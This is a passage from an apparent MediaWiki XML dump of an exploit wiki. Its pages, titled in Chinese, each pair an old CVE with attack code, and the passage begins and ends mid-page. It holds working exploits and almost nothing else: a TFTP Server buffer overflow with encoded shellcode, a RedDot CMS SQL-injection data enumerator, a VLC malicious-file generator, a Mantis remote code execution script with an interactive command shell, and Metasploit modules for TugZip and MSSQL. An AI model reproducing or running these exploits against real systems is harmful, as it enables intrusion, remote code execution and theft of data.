my @results=sendraw("GET /scripts/logfiles.tar.gz HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}

if ($flag==1){print "THIS HOST IS VULNERABLE!!! :-)\n
Check the details on www [dot] sybsecurity [dot] com\n";}
else {print "THIS HOST IS NOT VULNERABLE :-( \n
Check the settings on browser...\n";}

sub sendraw {
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S); $|=1; print $pstr;
                while(&lt;S&gt;){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect check the port or address...\n"); }
}

# milw0rm.com [2007-12-27]
&lt;/pre&gt;</text>
      <sha1>rp67i5ac5qafrpl48tjic37uc930tvd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-1611 TFTP Server SP 1.4堆棧緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>632</id>
    <revision>
      <id>849</id>
      <timestamp>2021-04-01T03:36:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; import struct import socket  # CVE-2008-1611 PoC written by Axua  prefix = "\x00\x02\x2f\x2e\x3a\x2f" suffix = "\x00\x00\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00"..."</comment>
      <origin>849</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2167" sha1="q9q946htrx1h1bvep2kbwkuljquz8ql" xml:space="preserve">==POC==
&lt;pre&gt;
import struct
import socket

# CVE-2008-1611 PoC written by Axua

prefix = "\x00\x02\x2f\x2e\x3a\x2f"
suffix = "\x00\x00\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00"

shellcode = (
"\xbb\x1b\xd0\x39\x36\xdd\xc7\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x58\x12\x03\x58\x12\x83\xdb\xd4\xdb\xc3\x27\x3c\x99"
"\x2c\xd7\xbd\xfe\xa5\x32\x8c\x3e\xd1\x37\xbf\x8e\x91\x15\x4c"
"\x64\xf7\x8d\xc7\x08\xd0\xa2\x60\xa6\x06\x8d\x71\x9b\x7b\x8c"
"\xf1\xe6\xaf\x6e\xcb\x28\xa2\x6f\x0c\x54\x4f\x3d\xc5\x12\xe2"
"\xd1\x62\x6e\x3f\x5a\x38\x7e\x47\xbf\x89\x81\x66\x6e\x81\xdb"
"\xa8\x91\x46\x50\xe1\x89\x8b\x5d\xbb\x22\x7f\x29\x3a\xe2\xb1"
"\xd2\x91\xcb\x7d\x21\xeb\x0c\xb9\xda\x9e\x64\xb9\x67\x99\xb3"
"\xc3\xb3\x2c\x27\x63\x37\x96\x83\x95\x94\x41\x40\x99\x51\x05"
"\x0e\xbe\x64\xca\x25\xba\xed\xed\xe9\x4a\xb5\xc9\x2d\x16\x6d"
"\x73\x74\xf2\xc0\x8c\x66\x5d\xbc\x28\xed\x70\xa9\x40\xac\x1c"
"\x1e\x69\x4e\xdd\x08\xfa\x3d\xef\x97\x50\xa9\x43\x5f\x7f\x2e"
"\xa3\x4a\xc7\xa0\x5a\x75\x38\xe9\x98\x21\x68\x81\x09\x4a\xe3"
"\x51\xb5\x9f\xa4\x01\x19\x70\x05\xf1\xd9\x20\xed\x1b\xd6\x1f"
"\x0d\x24\x3c\x08\xa4\xdf\xd7\xf7\x91\xbd\x33\x90\xe3\x41\x2d"
"\x3c\x6d\xa7\x27\xac\x3b\x70\xd0\x55\x66\x0a\x41\x99\xbc\x77"
"\x41\x11\x33\x88\x0c\xd2\x3e\x9a\xf9\x12\x75\xc0\xac\x2d\xa3"
"\x6c\x32\xbf\x28\x6c\x3d\xdc\xe6\x3b\x6a\x12\xff\xa9\x86\x0d"
"\xa9\xcf\x5a\xcb\x92\x4b\x81\x28\x1c\x52\x44\x14\x3a\x44\x90"
"\x95\x06\x30\x4c\xc0\xd0\xee\x2a\xba\x92\x58\xe5\x11\x7d\x0c"
"\x70\x5a\xbe\x4a\x7d\xb7\x48\xb2\xcc\x6e\x0d\xcd\xe1\xe6\x99"
"\xb6\x1f\x97\x66\x6d\xa4\xa9\x97\xbf\x31\x3d\x0e\x2a\x78\x23"
"\xb1\x81\xbf\x5a\x32\x23\x40\x99\x2a\x46\x45\xe5\xec\xbb\x37"
"\x76\x99\xbb\xe4\x77\x88")

padding1 = "\x41" * 236
padding2 = "\x42" * (984 - len(shellcode))

far_jump = "\xE9\x23\xFC\xFF\xFF"

nseh = "\xEB\xF9\x90\x90" # jmp short -8
seh = "\x8c\x2b\x40" # POP EDI; POP EBP; RET; @ TFTPServerSP.exe # partial overwrite 0x00402b8c

payload =  prefix
payload += padding1
payload += shellcode
payload += padding2
payload += far_jump
payload += nseh 
payload += seh   
payload += suffix

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload, ("192.168.99.155", 69))



&lt;/pre&gt;</text>
      <sha1>q9q946htrx1h1bvep2kbwkuljquz8ql</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-1613 RedDot CMS 7.5 Build 7.5.0.48 SQL注入漏洞</title>
    <ns>0</ns>
    <id>651</id>
    <revision>
      <id>882</id>
      <timestamp>2021-04-02T03:07:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/env python  # un-comment your selection.  import urllib2 import urllib import string import getopt import sys  def banner():   print   print "RED DOT..."</comment>
      <origin>882</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4500" sha1="fxeu4ppijrfxozrwjgqwnywoi1kczx0" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/env python

# un-comment your selection.

import urllib2
import urllib
import string
import getopt
import sys

def banner():
  print
  print "RED DOT CMS 7.5 database enumeration"
  print "by Mark Crowther and Rodrigo Marcos"

def usage():
  print
  print "usage():"
  print "python RD_POC.py [options] URL"
  print
  print " [options]"
  print "    --dbenum: Database enumeration"
  print "    --tableenum: Table enumeration, use -d to specify database"
  print "    --colenum: Column enumeration, use -d to specify database and -t to specify table"
  print "    --dataenum: Data enumeration, use -d to specify database, -t to specify table and -c to specify a column"
  print "    -d: Specify a database"
  print "    -t: Specify a table"
  print "    -c: Specify a column"
  print "    -h: Help page"
  print
  print "Examples: "
  print "    python RD_POC.py --dbenum http://myhost/cms/"
  print "    python RD_POC.py --tableenum -d IoAdministration http://myhost/cms/"
  print "    python RD_POC.py --colenum -d IoAdministration -t IO_USR http://myhost/cms/"
  print "    python RD_POC.py --dataenum -d IoAdministration -t IO_USR -c USR2 http://myhost/cms/"
  print
  sys.exit()

def retrievedata(url1, url2 = "' ORDER BY 1;-- &amp;DisableAutoLogin=1"):
  stop = 0

  current = ''

  while (stop==0):

    request = url1 + current + url2

    request = string.replace(request, ' ', '%20')
    req = urllib2.Request(request)
    try:
      r = urllib2.urlopen(req)
    except urllib2.URLError, msg:
      print "[+] Error: Error requesting URL (%s)" % msg
    result = r.read()

    #print result
    if string.find(result, ' Description  Conversion failed when converting the ') == -1:
      stop = 1
    else:
      start = string.find(result, "'") + 1
      end = string.find(result[start:], "'") + start
      current = result[start:end]
      print current


def dbenum():

  retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYS.SYSDATABASES where name&gt; '")

def tableenum(database=''):

  if database=='':
    retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSOBJECTS where xtype=char(85) and name&gt; '")

  else:
    retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSOBJECTS where xtype=char(85) and name&gt; '")

def colenum(table, database=''):

  if table=='':
    usage()

  if database=='':
    retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM SYSCOLUMNS where name &gt; '", "' AND id = (SELECT id from SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &amp;DisableAutoLogin=1")
  else:
    retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT min(name) FROM " + database + "..SYSCOLUMNS where name &gt; '","' AND id = (SELECT id from " + database + "..SYSOBJECTS WHERE name= '" + table + "') ORDER BY 1;-- &amp;DisableAutoLogin=1")


def dataenum(column, table, database=''):

  if column=='' or table=='':
    usage()

  if database=='':
    retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + table + " WHERE " + column + "&gt; '")
  
  else:
    retrievedata(url + "/ioRD.asp?Action=ShowMessage&amp;LngId=ENG.DGC0 FROM IO_DGC_ENG UNION SELECT MIN(" + column + ") FROM " + database + ".." + table + " WHERE " + column + "&gt; '")


banner()
pdbenum = 0
ptableenum = 0
pcolenum = 0
pdataenum = 0
database = ''
table = ''
column = ''

url =  sys.argv[len(sys.argv)-1]

try:
  opts, args = getopt.getopt(sys.argv[1:], "d:t:c:h:", ["help", "dbenum", "tableenum", "colenum", "dataenum"])
except getopt.GetoptError:
  usage()

try:
  for o, a in opts:
    if o in ("-h", "--help"):
      usage()
    if o == "--dbenum":
      pdbenum = 1
    if o == "--tableenum":
      ptableenum = 1
    if o == "--colenum":
      pcolenum = 1
    if o == "--dataenum":
      pdataenum = 1
    if o == "-d":
      database = a
    if o == "-t":
      table = a
    if o == "-c":
      column = a
except:
  usage()


if pdbenum == 1:
  print 'Enumerating databases:'
  dbenum()
elif ptableenum == 1:
  print 'Enumerating tables:'
  tableenum(database)
elif pcolenum == 1:
  print 'Enumerating columns:'
  colenum(table, database)
elif pdataenum == 1:
  print 'Enumerating data:'
  dataenum(column, table, database)
else:
  usage()

&lt;/pre&gt;</text>
      <sha1>fxeu4ppijrfxozrwjgqwnywoi1kczx0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-2019 Simple Machines Forum驗證碼繞過漏洞</title>
    <ns>0</ns>
    <id>652</id>
    <revision>
      <id>883</id>
      <timestamp>2021-04-02T03:10:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2008-2019.zip"</comment>
      <origin>883</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="ejlzjk5d6jjvq46zfn7h13aik90a8nk" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2008-2019.zip</text>
      <sha1>ejlzjk5d6jjvq46zfn7h13aik90a8nk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-4654 VLC Media Player 0.9.0 through 0.9.4緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>653</id>
    <revision>
      <id>884</id>
      <timestamp>2021-04-02T03:12:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python # # VLC 0.9.4 Stack-based Buffer Overflow exploit while demuxing # TiVo file format as it was described by Tobias Klein in his  # 	http://www.t..."</comment>
      <origin>884</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2861" sha1="kxljceef914bkth9yf5o5oosn40h0m9" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python
#
# VLC 0.9.4 Stack-based Buffer Overflow exploit while demuxing
# TiVo file format as it was described by Tobias Klein in his 
# 	http://www.trapkit.de/advisories/TKADV2008-010.txt	
# CVE-2008-4654
#
# Shellcode has no bad characters requirements, 
# but must be at most 187 bytes long.
#
# Exploit by Mariusz B.
#

import struct
import sys
import os

# 0x68f0cfad : jmp esp 
# {PAGE_EXECUTE_READ} [libqt4_plugin.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False
RETURN_ADDRESS = 0x68f0cfad

TIVO_MAGIC = 0xf5467abd

# Aligns ESP stack pointer
# push    esp
# pop     eax
# sub     ax, 0x180
# mov     esp, eax
STACK_ALIGN = "\x54\x58\x66\x2d\x80\x01\x8b\xe0"


#
# Shellcode to be used - no bad chars.
# It must be at most 187 characters long!
#
# Below: 112 bytes long CreateProcess("calc")
# 	source: https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html
#
SHELLCODE =  (
	"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
	"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
	"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
	"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
	"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
	"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
	"\x45\x81\x3e\x43\x72\x65\x61\x75"
	"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
	"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
	"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
	"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
	"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
	"\x6c\x63\x89\xe2\x52\x52\x53\x53"
	"\x53\x53\x53\x53\x52\x53\xff\xd7"
)


def replace(data, start, length, what):
	for (n, r) in zip(range(start, start+length), list(what)):
		data[n] = r

	return data

def main(argv):
	if len(argv) == 1:
		print 'Usag: vlc-exploit.py &lt;tivo-file&gt;'
		sys.exit(1)

	data = bytearray()
	with open(argv[1], 'rb') as f:
		data = bytearray(f.read())

	pos = data.find(str(struct.pack('&gt;I', TIVO_MAGIC)))
	if pos == -1:
		print '[!] Not a valid TiVo file.'
		sys.exit(1)

	print '[.] Got a valid TiVo file.'

	# Step 1: Replace TiVo's i_map_size variable in order to trigger out of bounds read.
	data = replace(data, pos + 20, 4, struct.pack('&gt;I', 0xff))

	# Step 2: Prepare a return address as a JMP ESP
	data = replace(data, pos + 0x5c, 4, struct.pack('&lt;I', RETURN_ADDRESS))
	data = replace(data, pos + 0x60, 4, '\x90' * 4)
	#data = replace(data, pos + 0x60, 4, '\xcc' + '\x90' * 3)	# DEBUG the shellcode

	# Step 3: Insert a shellcode
	print '[+] Writing {} bytes long shellcode...'.format(len(SHELLCODE))
	data = replace(data, pos + 0x64, len(STACK_ALIGN), STACK_ALIGN)
	data = replace(data, pos + 0x64 + len(STACK_ALIGN), len(SHELLCODE), SHELLCODE)

	print '[+] Exploit prepared.'

	new_file = os.path.join(os.path.dirname(argv[1]), os.path.splitext(argv[1])[0] + '-exploit.ty')
	with open(new_file, 'wb') as f:
		f.write(data)

	print '[+] Prepared file: "{}"'.format(new_file)

if __name__ == '__main__':
	main(sys.argv)

&lt;/pre&gt;</text>
      <sha1>kxljceef914bkth9yf5o5oosn40h0m9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-4687 Mantis任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>654</id>
    <revision>
      <id>885</id>
      <timestamp>2021-04-02T03:15:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Quick and dirty exploit for CVE-2008-4687. # Description by NIST: # manage_proj_page.php in Mantis before 1.1.4 allows remote authenticated users to # execute..."</comment>
      <origin>885</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2109" sha1="id17fs79666pxb3acqrm7ztvcowooyk" xml:space="preserve">==EXP==
&lt;pre&gt;
# Quick and dirty exploit for CVE-2008-4687.
# Description by NIST:
# manage_proj_page.php in Mantis before 1.1.4 allows remote authenticated users to
# execute arbitrary code via a sort parameter containing PHP sequences, which are p
# rocessed by create_function within the multi_sort function in core/utility_api.php.
# Author: Nelson Murilo
# Date: 2020/02/15

import requests
import hashlib
import base64
import sys

if len(sys.argv) != 5:
   print ("Usage: pymantis host path user pass")
   exit(-1)

host = sys.argv[1]
path = sys.argv[2]
user = sys.argv[3]
pwd = sys.argv[4]

urlbase = "http://" + host
# just a little joke
ua = 'Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US'
p='PHPSESSID='+str(hashlib.md5('xploit'.encode()).hexdigest())

d = { 'username':user , 'password': pwd }
r = requests.Session()
ret = r.get(urlbase + path + 'login_page.php')

h = {
    'Host': host,
    'User-Agent': ua,
    'Cookie': p,
    'Connection': 'close'
}
ret = r.post(urlbase + path + 'login.php', data=d, headers=h)
try:
    cookies = p + "; ISSUES_STRING_COOKIE=" + r.cookies['ISSUES_STRING_COOKIE']
    print("** Exploit works like a charm!")
except:
    print("Ops! Exploit fail - Bye")
    quit()
#
# Poor man reverse shell
#

r.headers
{
    'Host': host,
    'Cookie': cookies,
    'Content-type': 'application/json; charset=utf-8',
    'Connection': 'close'
}
pow = "\']);}error_reporting(0);print(_code_);passthru(base64_decode($_SERVER[HTTP_CMD]));die;%23"
url = urlbase + path + 'manage_proj_page.php?sort=' + pow

cmd = ""
while True:
    cmd = input("www-data# ")
    if not cmd:
        continue
    if cmd.lower() in {'exit'}:
        break
    h = {
        'Host': host,
        'User-Agent': ua,
        'Cookie': cookies,
        'Cmd': base64.b64encode(cmd.encode('utf-8')).decode('utf-8'),
        'Connection': 'close'
    }
    ret = requests.get(url, headers=h)
    response = str(ret.content)
    for line in response.partition('_code_')[2].split("\\n"):
        print(line.strip("\'"))
print("Bye")

&lt;/pre&gt;</text>
      <sha1>id17fs79666pxb3acqrm7ztvcowooyk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-4779 TugZip 3.5 Zip文件解析緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>509</id>
    <revision>
      <id>712</id>
      <timestamp>2021-03-27T03:21:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # $Id: tugzip.rb 13868 2011-10-11 03:30:14Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commerc..."</comment>
      <origin>712</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3783" sha1="59yujc4m9r066t4j0pyh15ihddhueiu" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# $Id: tugzip.rb 13868 2011-10-11 03:30:14Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 &lt; Msf::Exploit::Remote
 Rank = GoodRanking

 include Msf::Exploit::FILEFORMAT

 def initialize(info = {})
  super(update_info(info,
   'Name'           =&gt; 'TugZip 3.5 Zip File Parsing Buffer Overflow Vulnerability',
   'Description'    =&gt; %q{
     This module exploits a stack-based buffer overflow vulnerability
    in the latest version 3.5 of TugZip archiving utility.
    In order to trigger the vulnerability, an attacker must convince someone
    to load a specially crafted zip file with TugZip by double click or file open.
    By doing so, an attacker can execute arbitrary code as the victim user.
   },
   'License'        =&gt; MSF_LICENSE,
   'Author'         =&gt;
    [
     'Stefan Marin', # Vulnerability discovery
     'Lincoln', # Corelan team. Original exploit
     'TecR0c &lt;roccogiovannicalvi[at]gmail.com&gt;', # Metasploit module
     'mr_me &lt;steventhomasseeley[at]gmail.com&gt;',  # Metasploit module
    ],
   'Version'        =&gt; '$Revision: 13868 $',
   'References'     =&gt;
    [
     [ 'OSVDB', '49371' ],
     [ 'CVE', '2008-4779' ],
     [ 'BID', '17432' ],
     [ 'URL', 'http://www.exploit-db.com/exploits/12008/' ]
    ],
   'Platform'       =&gt; [ 'win' ],
   'Payload'        =&gt;
    {
     'BadChars'      =&gt; "\x00\x0f\x14\x15\x2f" + (0x80..0xff).to_a.pack('C*'),
     'DisableNops'   =&gt; true, # no need
     'EncoderType'   =&gt; Msf::Encoder::Type::AlphanumMixed,
     'EncoderOptions' =&gt;
      {
       'BufferRegister' =&gt; 'EDI', # Egghunter jmp EDI
      }
    },

   'Targets'        =&gt;
    [
     [
      'Universal',
      {
       'Ret'    =&gt; 0x7e0c307e,
       # 5.00.2147.1 [ztvcabinet.dll]
       # POP EBX &gt; POP EBP &gt; RETN
       'Offset' =&gt; 372, # to nseh
      }
     ],
    ],
   'DislosureDate' =&gt; 'Oct 28 2008',
   'DefaultTarget'  =&gt; 0))

   register_options(
   [
    OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),
   ], self.class)

 end

 def exploit

  # Hardcoded egghunter due to size limit (before nseh destroyed/130D past seh of usable bytes)
  # base register ESI
  hunter = "VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIK9Jzs"
  hunter &lt;&lt; "rbrRJuRRxzmvNWLWuQJt4ZOnXPwtpTpQdLKJZLoPuzJNO3EXgkOJGA"
  eggtag = 'w00t' * 2

  getpc_asm = %q{
   popad
   popad
   popad
   popad
   popad
   pop ebx
  }

  # Align EBX for hunter
  alignment = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string

  # Align for ESI + factoring mangled chars
  alignment &lt;&lt; "\x89\x05"              # jmp short (5 bytes) to 'jmp back' at end
  alignment &lt;&lt; "\x5e"                  # pop esi
  alignment &lt;&lt; "\x41"                  # nop (inc ecx)
  alignment &lt;&lt; "\x98\x99"              # call esi
  alignment &lt;&lt; "\x41"                  # nop (inc ecx)
  alignment &lt;&lt; "\x8a\x94\x98\x98\x98"  # jmp back to pop esi

  getpc_asm = %q{
   popad
   pop esp
   inc eax
   inc eax
  }

  # Realign stack pointer
  nseh = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string

  seh = [target.ret].pack("V*")

  sploit = rand_text_alpha(target['Offset'])
  sploit &lt;&lt; nseh &lt;&lt; seh
  sploit &lt;&lt; alignment
  sploit &lt;&lt; hunter
  sploit &lt;&lt; eggtag &lt;&lt; payload.encoded

  zip = Rex::Zip::Archive.new
  xtra = [0xdac0ffee].pack('V')
  comment = [0xbadc0ded].pack('V')
  zip.add_file(sploit, xtra, comment)

  # Create the file
  print_status("Creating '#{datastore['FILENAME']}' file...")

  file_create(zip.pack)
 end

end


&lt;/pre&gt;</text>
      <sha1>59yujc4m9r066t4j0pyh15ihddhueiu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-5416 Microsoft SQL Server 2000緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>655</id>
    <revision>
      <id>886</id>
      <timestamp>2021-04-02T03:18:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # $Id: ms09_004_sp_replwritetovarbin_sqli.rb 11631 2011-01-24 19:37:58Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to #..."</comment>
      <origin>886</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="20156" sha1="5lw7vemjqwzeuheypgw0xs79zia9aqv" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# $Id: ms09_004_sp_replwritetovarbin_sqli.rb 11631 2011-01-24 19:37:58Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::MSSQL_SQLI

  def initialize(info = {})

    super(update_info(info,
      'Name'           =&gt; 'Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection',
      'Description'    =&gt; %q{
          A heap-based buffer overflow can occur when calling the undocumented
        "sp_replwritetovarbin" extended stored procedure. This vulnerability affects
        all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database,
        and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004.
        Microsoft patched this vulnerability in SP3 for 2005 without any public
        mention.

        This exploit smashes several pointers, as shown below.

        1. pointer to a 32-bit value that is set to 0
        2. pointer to a 32-bit value that is set to a length influcenced by the buffer
          length.
        3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000,
          this value is referenced with a displacement of 0x38. For MSSQL 2005, the
          displacement is 0x10. The address of our buffer is conveniently stored in
          ecx when this instruction is executed.
        4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with
          a displacement of 4. This pointer is not used by this exploit.

        This particular exploit replaces the previous dual-method exploit. It uses
        a technique where the value contained in ecx becomes the stack. From there,
        return oriented programming is used to normalize the execution state and
        finally execute the payload via a "jmp esp". All addresses used were found
        within the sqlservr.exe memory space, yielding very reliable code execution
        using only a single query.

        NOTE: The MSSQL server service does not automatically restart by default. That
        said, some exceptions are caught and will not result in terminating the process.
        If the exploit crashes the service prior to hijacking the stack, it won't die.
        Otherwise, it's a goner.
      },
      'Author'         =&gt;
        [
          'jduck',          # MS09-004 base exploit
          'Rodrigo Marcos'  # SQL Injection mods
        ],
      'License'        =&gt; MSF_LICENSE,
      'Version'        =&gt; '$Revision: 11631 $',
      'References'     =&gt;
        [
          [ 'OSVDB', '50589' ],
          [ 'CVE', '2008-5416' ],
          [ 'BID', '32710' ],
          [ 'MSB', 'MS09-004' ],
          [ 'URL', 'http://www.milw0rm.com/exploits/7501' ],
          [ 'URL', 'http://www.secforce.co.uk/blog/2011/01/exploiting-ms09-004-via-sql-injection/' ]
        ],
      'DefaultOptions' =&gt;
        {
          'EXITFUNC' =&gt; 'seh',
               'InitialAutoRunScript' =&gt; 'migrate -f'
        },
      'Payload'        =&gt;
        {
          'Space'    =&gt; 512,
          'BadChars' =&gt; "", # bad bytes get encoded!
          'PrependEncoder' =&gt; "\x81\xc4\xf0\xef\xff\xff",
          'DisableNops' =&gt; true
        },
      'Platform'       =&gt; 'win',
      'Privileged'     =&gt; true,
      'Targets'        =&gt;
        [
          # auto targeting!
          [ 'Automatic', { } ],

          #
          # Individual targets
          #
          [
            # Microsoft SQL Server  2000 - 8.00.194 (Intel X86)
            # Aug  6 2000 00:57:48
            'MSSQL 2000 / MSDE SP0 (8.00.194)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; -13,         # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x38,        # displacement from call [eax+0x38] crash
              'Writable' =&gt; 0x42b6cfe0,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x00a87f26,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x6900a7,    # not directly used - call [ecx+0x08]
              'Disp'     =&gt; 0x08,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x0041b78f,  # xchg ecx,esp / sbb [eax],al / pop esi / ret
              'Popped'   =&gt; 0x4,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x28,        # offset to the new stack!
              'FixESP'   =&gt; 0x0071f5fb,  # advance esp to next ret (add esp,0x20 / ret)
              'Ret'      =&gt; 0x0041c9a2   # jmp esp
            },
          ],

          [
            # Microsoft SQL Server  2000 - 8.00.384 (Intel X86)
            # May 23 2001 00:02:52
            'MSSQL 2000 / MSDE SP1 (8.00.384)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; -13,         # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x38,        # displacement from call [eax+0x38] crash
              'Writable' =&gt; 0x42b6cfe0,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x00a95b2f,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x4b4f00,    # not directly used - call [ecx-0x18]
              'Disp'     =&gt; 0x34,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x0044d300,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret
              'Popped'   =&gt; 0x8,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x28,        # offset to the new stack!
              'FixESP'   =&gt; 0x004a2ce9,  # advance esp to next ret (add esp,0x1c / ret)
              'Ret'      =&gt; 0x004caa15   # jmp esp
            },
          ],

          [
            # Microsoft SQL Server  2000 - 8.00.534 (Intel X86)
            # Nov 19 2001 13:23:50
            'MSSQL 2000 / MSDE SP2 (8.00.534)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; -13,         # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x38,        # displacement from call [eax+0x38] crash
              'Writable' =&gt; 0x42b6cfe0,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x00a64f7e,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x660077,    # not directly used - call [ecx-0x18]
              'Disp'     =&gt; 0x34,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x0054131c,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret
              'Popped'   =&gt; 0x8,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x28,        # offset to the new stack!
              'FixESP'   =&gt; 0x005306a0,  # advance esp to next ret (add esp,0x1c / ret)
              'Ret'      =&gt; 0x004ca984   # jmp esp
            },
          ],

          [
